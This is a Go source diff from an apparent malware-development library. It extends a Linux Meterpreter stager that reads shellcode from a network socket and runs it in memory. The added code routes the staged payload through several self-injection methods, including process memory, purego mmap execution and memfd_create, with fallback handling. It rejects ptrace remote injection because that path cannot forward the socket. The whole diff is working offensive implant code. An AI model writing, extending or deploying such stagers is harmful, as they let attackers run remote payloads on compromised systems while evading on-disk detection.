@@ -16,6 +16,7 @@ import (
 	"net"
 	"os"
 	"runtime"
+	"syscall"
 	"time"
 
 	"github.com/oioio-space/maldev/inject"
@@ -49,11 +50,56 @@ func (s *Stager) stageLinux() error {
 		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
 	}
 
-	// Use inject.InjectMeterpreterWrapper which uses purego.SyscallN
-	// for proper System V AMD64 ABI calling convention. The raw
-	// unsafe.Pointer function-pointer cast does not set up registers
-	// correctly on Linux and crashes.
+	// Route through inject package when a specific method is requested.
+	if s.config.Method != "" {
+		return s.executeWithInjectionLinux(shellcode, sockfd)
+	}
+
+	// Default: purego mmap execution with socket passthrough.
+	// InjectMeterpreterWrapper uses purego.SyscallN for proper
+	// System V AMD64 ABI calling convention.
 	return inject.InjectMeterpreterWrapper(sockfd, shellcode)
+}
+
+// executeWithInjectionLinux routes stage execution through the inject package.
+//
+// The Linux Meterpreter wrapper (126 bytes) expects to read the full ELF
+// payload from stdin (the socket). This only works for self-inject methods
+// where the current process owns the socket. Remote methods (ptrace) cannot
+// forward the socket to the target, so they are rejected.
+func (s *Stager) executeWithInjectionLinux(shellcode []byte, sockfd int) error {
+	// Remote injection is incompatible with the Meterpreter wrapper protocol:
+	// the 126-byte wrapper reads the ELF from stdin (fd 0), which is not
+	// available in the target process.
+	if s.config.TargetPID != 0 {
+		syscall.Close(sockfd)
+		return fmt.Errorf("remote injection (PID != 0) is not supported for Linux Meterpreter staging: wrapper requires socket access")
+	}
+
+	// Self-inject methods: route through InjectMeterpreterWrapper which
+	// handles dup2(sockfd, 0) + mmap + purego execution.
+	switch s.config.Method {
+	case inject.MethodProcMem, inject.MethodPureGoMeterpreter, inject.MethodPureGoShellcode:
+		return inject.InjectMeterpreterWrapper(sockfd, shellcode)
+	case inject.MethodMemFD:
+		// memfd_create is a self-inject method but uses a different
+		// execution model (anonymous file). Route through inject package.
+		cfg := &inject.Config{
+			Method:   s.config.Method,
+			Fallback: s.config.Fallback,
+		}
+		if s.config.Fallback {
+			return inject.InjectWithFallback(cfg, shellcode)
+		}
+		injector, err := inject.NewInjector(cfg)
+		if err != nil {
+			return fmt.Errorf("stage execution failed: %w", err)
+		}
+		return injector.Inject(shellcode)
+	default:
+		// Unknown or unhandled self-inject method: use wrapper path.
+		return inject.InjectMeterpreterWrapper(sockfd, shellcode)
+	}
 }
 
 // fetchStageLinux retrieves the stage and returns the socket fd.
